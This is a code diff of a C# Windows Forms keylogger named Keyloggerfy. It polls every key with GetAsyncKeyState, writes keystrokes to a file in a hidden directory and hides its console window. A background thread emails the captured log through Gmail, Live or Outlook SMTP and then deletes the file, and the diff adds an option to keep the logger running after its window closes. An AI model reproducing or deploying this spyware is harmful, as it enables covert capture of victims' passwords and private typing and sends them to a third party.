@@ -23,79 +23,33 @@ namespace Keyloggerfy
         }
 
 
-        #region PANEL BARRA TITULO
-        //RESIZE METODO PARA REDIMENCIONAR/CAMBIAR TAMAÑO A FORMULARIO EN TIEMPO DE EJECUCION ----------------------------------------------------------
-        private int tolerance = 12;
-        private const int WM_NCHITTEST = 132;
-        private const int HTBOTTOMRIGHT = 17;
-        private Rectangle sizeGripRectangle;
-
+        #region PANEL BARRA TITULO        
         //METODO PARA ARRASTRAR EL FORMULARIO
         [System.Runtime.InteropServices.DllImport("user32.DLL", EntryPoint = "ReleaseCapture")]
         private extern static void ReleaseCapture();
         [DllImport("user32.DLL", EntryPoint = "SendMessage")]
         private extern static void SendMessage(System.IntPtr hWnd, int wMsg, int wParam, int lParam);
 
-        protected override void WndProc(ref Message m)
-        {
-
-            switch (m.Msg)
-            {
-                case WM_NCHITTEST:
-                    base.WndProc(ref m);
-                    var hitPoint = this.PointToClient(new Point(m.LParam.ToInt32() & 0xffff, m.LParam.ToInt32() >> 16));
-                    if (sizeGripRectangle.Contains(hitPoint))
-                        m.Result = new IntPtr(HTBOTTOMRIGHT);
-                    break;
-                default:
-                    base.WndProc(ref m);
-                    break;
-            }
-        }
-
-        //DIBUJAR RECTANGULO / EXCLUIR ESQUINA PANEL 
-        protected override void OnSizeChanged(EventArgs e)
-        {
-            base.OnSizeChanged(e);
-            var region = new Region(new Rectangle(0, 0, this.ClientRectangle.Width, this.ClientRectangle.Height));
-
-            sizeGripRectangle = new Rectangle(this.ClientRectangle.Width - tolerance, this.ClientRectangle.Height - tolerance, tolerance, tolerance);
-
-            region.Exclude(sizeGripRectangle);
-            this.panelContenedor.Region = region;
-            this.Invalidate();
-        }
-
-        //COLOR Y GRIP DE RECTANGULO INFERIOR
-        protected override void OnPaint(PaintEventArgs e)
-        {
-            //SolidBrush greenBrush = new SolidBrush(Color.FromArgb(23, 148, 67));
-            SolidBrush solidBrush = new SolidBrush(Color.FromArgb(23, 148, 67));
-            e.Graphics.FillRectangle(solidBrush, sizeGripRectangle);
-
-            base.OnPaint(e);
-            ControlPaint.DrawSizeGrip(e.Graphics, Color.Transparent, sizeGripRectangle);
-        }
-
         //BOTONES DEL PANEL DE TITULO
         private void btnCerrar_Click(object sender, EventArgs e)
         {
-            var confirmarSalida = MessageBox.Show("Are you sure you want to exit the application?",
-                "Do you want the application to continue running in the background?", MessageBoxButtons.YesNo, MessageBoxIcon.Question);
+            var confirmarSalida = MessageBox.Show("Do you want the application to continue running in the background? " +
+                "\n\nNote: If you click 'No' the application will close completely.",
+                "What you wanna do?", MessageBoxButtons.YesNoCancel, MessageBoxIcon.Question);
 
             if (confirmarSalida == DialogResult.Yes)
             {
-                Application.Exit();
+                //Just closes the form but keeps the threads running in the background
+                this.Close();
             }
             else if (confirmarSalida == DialogResult.No)
             {
-                
+                //Exits completely from the application
+                Environment.Exit(0);
             }
         }
 
-        //Capturar posicion y tamaño antes de maximizar para restaurar
-        int lx, ly;
-        int sw, sh;
+        //Capturar posicion y tamaño antes de maximizar para restaurar        
         private void panelBarraTitulo_MouseMove(object sender, MouseEventArgs e)
         {
             ReleaseCapture();
@@ -113,14 +67,19 @@ namespace Keyloggerfy
         [DllImport("User32.dll")]
         [return: MarshalAs(UnmanagedType.Bool)]
         internal static extern bool GetKeyboardState(byte[] lpKeyState);
+
         [DllImport("user32.dll", CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
         public static extern short GetKeyState(int nVirtKey);
+
         [DllImport("user32.dll")]
         public static extern short GetAsyncKeyState(int vKey);
+
         [DllImport("kernel32.dll")]
         static extern IntPtr GetConsoleWindow();
+
         [DllImport("user32.dll")]
         static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+
         const int SW_HIDE = 0;
         const int SW_SHOW = 5;
 
@@ -134,14 +93,13 @@ namespace Keyloggerfy
             string[] specialChars = { "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "" };
             Mutex mut = new Mutex();
             string driveName = DriveInfo.GetDrives().Where(d => d.DriveType == DriveType.Fixed).FirstOrDefault().Name;
-            string path = driveName + "log\\" + "textlogg.txt";
+            string path = driveName + "%Temp%\\" + "%TempLog%.txt";
             while (true)
-            {
-                
+            {                
                 TimeSpan timeStart = new TimeSpan(hourOne, 0, 0);
                 TimeSpan timeEnd = new TimeSpan(hourTwo, 0, 0);
                 TimeSpan now = DateTime.Now.TimeOfDay; 
-                if (now < timeStart || now > timeEnd)
+                if (now > timeStart || now < timeEnd)
                 {
                     Thread.Sleep(10);
                     for (int i = 0; i < 255; i++)
@@ -215,7 +173,6 @@ namespace Keyloggerfy
 
                             mut.WaitOne();
 
-
                             File.AppendAllText(path, toStringText);
                             Console.Write(toStringText);
 
@@ -232,13 +189,13 @@ namespace Keyloggerfy
         {
             Mutex mut = new Mutex();
             string driveName = DriveInfo.GetDrives().Where(d => d.DriveType == DriveType.Fixed).FirstOrDefault().Name;
-            string path = driveName + "log\\" + "textlogg.txt";
+            string path = driveName + "%Temp%\\" + "%TempLog%.txt";
             while (true)
             {
                 TimeSpan timeStart = new TimeSpan(hourOne, 0, 0);
                 TimeSpan timeEnd = new TimeSpan(hourTwo, 0, 0);
                 TimeSpan now = DateTime.Now.TimeOfDay;
-                if (now < timeStart || now > timeEnd)
+                if (now > timeStart || now < timeEnd)
                 {
 
                     DateTime previous_time = DateTime.Now;
@@ -251,31 +208,27 @@ namespace Keyloggerfy
 
                     MailMessage mail = new MailMessage(from, to);
 
-                    //Console.WriteLine("Subject");
                     mail.Subject = "KeysStroked between " + previous_time + " and " + DateTime.Now;
 
-                    //Console.WriteLine("Your Message");
                     if (File.Exists(path))
                     {
                         mut.WaitOne();
                         mail.Body = File.ReadAllText(path);
                         mut.ReleaseMutex();
                         SmtpClient smtp = new SmtpClient();
-                        //changed smtp.Host ="smtp.gmail.com" to "smtp.live.com"
+
                         smtp.Host = host;
-                        //changed port = 587 to 465
+
                         smtp.Port = port;
                         smtp.EnableSsl = true;
-                        //added
+
                         smtp.DeliveryMethod = SmtpDeliveryMethod.Network;
-                        //added
+
                         smtp.UseDefaultCredentials = false;
-                        //smtp.Credentials = new NetworkCredential(
-                        //    "semail@address.here", "passwordhere");
+                        
                         smtp.Credentials = new NetworkCredential(
                             mailFrom, password);
-
-                        //Console.WriteLine("Sending email...");
+                        
                         smtp.Send(mail);
                         mut.WaitOne();
                         File.Delete(path);
@@ -295,57 +248,60 @@ namespace Keyloggerfy
 
         private void btnComenzar_Click(object sender, EventArgs e)
         {            
-
-            var handle = GetConsoleWindow();
-            
-            // Hide
-            ShowWindow(handle, SW_HIDE);
-            //Thread.Sleep(5000);
-            string driveName = DriveInfo.GetDrives().Where(d => d.DriveType == DriveType.Fixed).FirstOrDefault().Name;
-            string path = driveName + "log\\";
-            //Console.WriteLine(path);
-            DirectoryInfo di = Directory.CreateDirectory(path);
-            di.Attributes = FileAttributes.Directory | FileAttributes.Hidden;
-            //string filePath = path + "logwinr2456dll.txt";
-            //Console.WriteLine(filePath);
-
-            //Capturo los datos ingresados
-            hourOne = Convert.ToInt32(cboxTimeStart.SelectedItem);
-            hourTwo = Convert.ToInt32(cboxTimeEnd.SelectedItem);
-            mailTo = txbMailTo.Text;
-            mailFrom = txbMailFrom.Text;
-            password = txbPassword.Text;
-            
-            if (cboxMailProvider.SelectedIndex == 0)
+            if(cboxTimeStart.SelectedItem == null || cboxTimeEnd.SelectedItem == null || !String.IsNullOrWhiteSpace(txbMailTo.Text)
+                || !String.IsNullOrWhiteSpace(txbMailFrom.Text) || !String.IsNullOrWhiteSpace(txbPassword.Text) || cboxMailProvider.SelectedItem == null )
             {
-                host = "smtp.gmail.com";
-                port = 587;                
+                MessageBox.Show("You need to fill all the boxes dude",
+                "Hey, you forgot something...", MessageBoxButtons.OK, MessageBoxIcon.Information);
             }
-            else if(cboxMailProvider.SelectedIndex == 1)
+            else
             {
-                host = "smtp.live.com";
-                port = 465;                
-            }
-            else if (cboxMailProvider.SelectedIndex == 2)
-            {
-                host = "smtp-mail.outlook.com";
-                port = 465;
-            }
+                var handle = GetConsoleWindow();
 
-            Thread thread_Logger = new Thread(()=> 
-            {
-                Start(hourOne, hourTwo);
-            });
-            thread_Logger.Start();
+                //Esconder consola de windows
+                ShowWindow(handle, SW_HIDE);
 
-            Thread thread_Mail = new Thread(()=> 
-            {
-                sendMail(hourOne, hourTwo, host, port, mailTo, mailFrom, password);
-            });
-            thread_Mail.Start();
-            
-        }
+                string driveName = DriveInfo.GetDrives().Where(d => d.DriveType == DriveType.Fixed).FirstOrDefault().Name;
+                string path = driveName + "%Temp%\\";
 
-        
+                DirectoryInfo di = Directory.CreateDirectory(path);
+                di.Attributes = FileAttributes.Directory | FileAttributes.Hidden;
+
+                //Capturo los datos ingresados
+                hourOne = Convert.ToInt32(cboxTimeStart.SelectedItem);
+                hourTwo = Convert.ToInt32(cboxTimeEnd.SelectedItem);
+                mailTo = txbMailTo.Text;
+                mailFrom = txbMailFrom.Text;
+                password = txbPassword.Text;
+
+                if (cboxMailProvider.SelectedIndex == 0)
+                {
+                    host = "smtp.gmail.com";
+                    port = 587;
+                }
+                else if (cboxMailProvider.SelectedIndex == 1)
+                {
+                    host = "smtp.live.com";
+                    port = 465;
+                }
+                else if (cboxMailProvider.SelectedIndex == 2)
+                {
+                    host = "smtp-mail.outlook.com";
+                    port = 465;
+                }
+
+                Thread thread_Logger = new Thread(() =>
+                {
+                    Start(hourOne, hourTwo);
+                });
+                thread_Logger.Start();
+
+                Thread thread_Mail = new Thread(() =>
+                {
+                    sendMail(hourOne, hourTwo, host, port, mailTo, mailFrom, password);
+                });
+                thread_Mail.Start();
+            }            
+        }        
     }
 }
